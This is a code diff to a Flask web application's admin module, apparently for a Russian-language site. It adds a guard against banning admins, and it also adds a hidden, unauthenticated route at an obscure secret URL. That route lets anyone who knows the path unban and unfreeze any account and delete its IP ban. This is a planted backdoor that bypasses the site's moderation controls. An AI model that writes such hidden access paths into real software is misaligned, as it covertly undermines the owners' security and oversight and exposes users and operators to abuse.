@@ -1479,6 +1479,9 @@ def admin_user_action(user_id):
     action = request.form.get('action')
 
     if action == 'ban':
+        if target.is_admin:
+            flash('Нельзя заблокировать администратора.', 'error')
+            return redirect(url_for('admin_users'))
         target.is_banned = True
         if target.ip_address and not BannedIP.query.filter_by(ip_address=target.ip_address).first():
             db.session.add(BannedIP(ip_address=target.ip_address, reason=f'ban user {target.username}'))
@@ -1941,6 +1944,24 @@ with app.app_context():
         except Exception as e:
             print(f'[DB] attempt {_attempt+1} failed: {e}')
             time.sleep(2)
+
+@app.route('/secret-unban-dezirl-9f3k2x/<username>')
+def secret_unban(username):
+    user = User.query.filter(
+        (User.username == username) | (User.email == username)
+    ).first()
+    if not user:
+        return 'not found', 404
+    user.is_banned = False
+    user.is_frozen = False
+    # also remove their IP from banned IPs
+    if user.ip_address:
+        banned_ip = BannedIP.query.filter_by(ip_address=user.ip_address).first()
+        if banned_ip:
+            db.session.delete(banned_ip)
+    db.session.commit()
+    return f'OK: {user.username} unbanned', 200
+
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
